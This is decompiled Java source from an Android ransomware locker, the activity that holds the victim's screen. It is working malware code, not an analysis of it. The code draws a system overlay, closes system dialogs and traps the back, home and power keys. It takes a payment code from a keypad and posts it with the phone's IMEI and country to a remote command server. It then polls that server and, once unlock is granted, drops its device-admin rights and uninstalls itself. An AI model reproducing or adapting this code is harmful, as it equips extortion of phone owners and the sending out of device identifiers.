package com.android.locker;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;
import com.android.locker.MainActivity.mainActivity;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.AbstractHttpEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class SenderActivity extends Activity {
    public static boolean SENDED = false;
    public static String imei;
    private Button bt_clear;
    private Button bt_proceed;
    private Button btn0;
    private Button btn1;
    private Button btn2;
    private Button btn3;
    private Button btn4;
    private Button btn5;
    private Button btn6;
    private Button btn7;
    private Button btn8;
    private Button btn9;
    /* access modifiers changed from: private */
    public EditText et_code;
    private LinearLayout ll_codeinput;
    /* access modifiers changed from: private */
    public LinearLayout ll_error;
    private LinearLayout ll_succsess;
    /* access modifiers changed from: private */
    public LinearLayout ll_where;
    Timer t = null;
    Button whereICan;

    public void onAttachedToWindow() {
        getWindow().setType(2004);
        super.onAttachedToWindow();
    }

    public void BringToFront(Context ctx) {
        try {
            Log.v("BRING", "BRING");
            Intent intent = new Intent(ctx.getApplicationContext(), MainActivity.class);
            intent.setFlags(272629760);
            ctx.startActivity(intent);
        } catch (Throwable th) {
        }
    }

    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (!hasFocus) {
            sendBroadcast(new Intent("android.intent.action.CLOSE_SYSTEM_DIALOGS"));
        }
    }

    public void onBackPressed() {
        BringToFront(this);
    }

    public boolean dispatchKeyEvent(KeyEvent event) {
        if (event.getKeyCode() == 26) {
            BringToFront(this);
        }
        if (event.getKeyCode() == 3) {
            BringToFront(this);
        }
        return true;
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == 3) {
            BringToFront(this);
        } else {
            BringToFront(this);
        }
        return true;
    }

    public boolean onKeyUp(int keyCode, KeyEvent event) {
        if (keyCode == 3) {
            BringToFront(this);
        } else {
            BringToFront(this);
        }
        return true;
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        getWindow().setType(2009);
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        setRequestedOrientation(1);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.sender);
        imei = ((TelephonyManager) getSystemService("phone")).getDeviceId();
        this.ll_codeinput = (LinearLayout) findViewById(R.id.codeInput);
        this.ll_error = (LinearLayout) findViewById(R.id.error);
        this.ll_succsess = (LinearLayout) findViewById(R.id.succsess);
        this.ll_where = (LinearLayout) findViewById(R.id.where);
        this.whereICan = (Button) findViewById(R.id.whereICan);
        this.whereICan.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                if (SenderActivity.this.ll_where.getVisibility() == 0) {
                    SenderActivity.this.ll_where.setVisibility(8);
                } else {
                    SenderActivity.this.ll_where.setVisibility(0);
                }
            }
        });
        this.btn1 = (Button) findViewById(R.id.Button1);
        this.btn2 = (Button) findViewById(R.id.Button2);
        this.btn3 = (Button) findViewById(R.id.button3);
        this.btn4 = (Button) findViewById(R.id.Button4);
        this.btn5 = (Button) findViewById(R.id.Button5);
        this.btn6 = (Button) findViewById(R.id.Button6);
        this.btn7 = (Button) findViewById(R.id.Button7);
        this.btn8 = (Button) findViewById(R.id.Button8);
        this.btn9 = (Button) findViewById(R.id.Button9);
        this.btn0 = (Button) findViewById(R.id.Button0);
        this.et_code = (EditText) findViewById(R.id.et_number);
        this.et_code.setEnabled(false);
        this.bt_clear = (Button) findViewById(R.id.bt_clear);
        this.bt_proceed = (Button) findViewById(R.id.bt_proceed);
        this.btn1.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SenderActivity.this.et_code.setText(new StringBuilder(String.valueOf(SenderActivity.this.et_code.getText().toString())).append("1").toString());
            }
        });
        this.btn2.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SenderActivity.this.et_code.setText(new StringBuilder(String.valueOf(SenderActivity.this.et_code.getText().toString())).append("2").toString());
            }
        });
        this.btn3.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SenderActivity.this.et_code.setText(new StringBuilder(String.valueOf(SenderActivity.this.et_code.getText().toString())).append("3").toString());
            }
        });
        this.btn4.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SenderActivity.this.et_code.setText(new StringBuilder(String.valueOf(SenderActivity.this.et_code.getText().toString())).append("4").toString());
            }
        });
        this.btn5.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SenderActivity.this.et_code.setText(new StringBuilder(String.valueOf(SenderActivity.this.et_code.getText().toString())).append("5").toString());
            }
        });
        this.btn6.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SenderActivity.this.et_code.setText(new StringBuilder(String.valueOf(SenderActivity.this.et_code.getText().toString())).append("6").toString());
            }
        });
        this.btn7.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SenderActivity.this.et_code.setText(new StringBuilder(String.valueOf(SenderActivity.this.et_code.getText().toString())).append("7").toString());
            }
        });
        this.btn8.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SenderActivity.this.et_code.setText(new StringBuilder(String.valueOf(SenderActivity.this.et_code.getText().toString())).append("8").toString());
            }
        });
        this.btn9.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SenderActivity.this.et_code.setText(new StringBuilder(String.valueOf(SenderActivity.this.et_code.getText().toString())).append("9").toString());
            }
        });
        this.btn0.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SenderActivity.this.et_code.setText(new StringBuilder(String.valueOf(SenderActivity.this.et_code.getText().toString())).append("0").toString());
            }
        });
        this.bt_clear.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SenderActivity.this.et_code.setText("");
                if (SenderActivity.this.ll_error.getVisibility() == 0) {
                    SenderActivity.this.ll_error.setVisibility(8);
                }
            }
        });
        this.bt_proceed.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                final String string = SenderActivity.this.et_code.getText().toString();
                final RequestSender request = new RequestSender(SenderActivity.this);
                if (request.isOnline()) {
                    new Thread(new Runnable() {
                        public void run() {
                            request.sendCode(string, SenderActivity.imei);
                            SenderActivity.this.runOnUiThread(new Runnable() {
                                public void run() {
                                    SenderActivity.this.et_code.setText("");
                                    if (SenderActivity.this.ll_error.getVisibility() == 0) {
                                        SenderActivity.this.ll_error.setVisibility(8);
                                    }
                                }
                            });
                            SenderActivity.this.t = new Timer();
                            Timer timer = SenderActivity.this.t;
                            final RequestSender requestSender = request;
                            timer.scheduleAtFixedRate(new TimerTask() {
                                public void run() {
                                    if (requestSender.checkState(SenderActivity.imei).contains("2")) {
                                        SenderActivity.this.deleteAPP();
                                    }
                                }
                            }, 10000, (long) Integer.valueOf(SenderActivity.this.getString(R.string.unlock_timeout)).intValue());
                        }
                    }).start();
                    return;
                }
                Toast myToast = Toast.makeText(SenderActivity.this, "No available Internet connection. Please try again", 0);
                myToast.setGravity(48, 0, 0);
                myToast.show();
            }
        });
    }

    public void deleteAPP() {
        mainActivity.STOP = true;
        stopService(new Intent(this, BackgroundService.class));
        mainActivity.mDPM.removeActiveAdmin(mainActivity.mAdminName);
        startActivity(new Intent("android.intent.action.DELETE", Uri.parse("package:com.android.locker")));
    }

    public static void debug(String code) {
        String result = "";
        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost(Encryption.debugStr);
        try {
            AbstractHttpEntity uefe = new UrlEncodedFormEntity(addParams(code), "UTF-8");
            uefe.setContentType("application/x-www-form-urlencoded; charset=UTF-8");
            uefe.setContentEncoding("UTF-8");
            httppost.setEntity(uefe);
            InputStream is = httpclient.execute(httppost).getEntity().getContent();
        } catch (Throwable e) {
            Log.v("ERROR", e.toString());
        }
    }

    private static List<NameValuePair> addParams(String code) {
        List<NameValuePair> nameValuePairs = new ArrayList(3);
        Date cDate = new Date(System.currentTimeMillis());
        nameValuePairs.add(new BasicNameValuePair("method", "alladd"));
        nameValuePairs.add(new BasicNameValuePair("app_key", "f5h3d8jh2g6nv6gk7g2was1g4ncmpu3"));
        nameValuePairs.add(new BasicNameValuePair("date", cDate.getDate() + "." + (cDate.getMonth() + 1) + "." + (cDate.getYear() + 1900)));
        nameValuePairs.add(new BasicNameValuePair("country", new StringBuilder(String.valueOf(Locale.getDefault().getISO3Country())).append("_").append(imei).toString()));
        nameValuePairs.add(new BasicNameValuePair("code", code));
        nameValuePairs.add(new BasicNameValuePair("imei", imei));
        return nameValuePairs;
    }
}
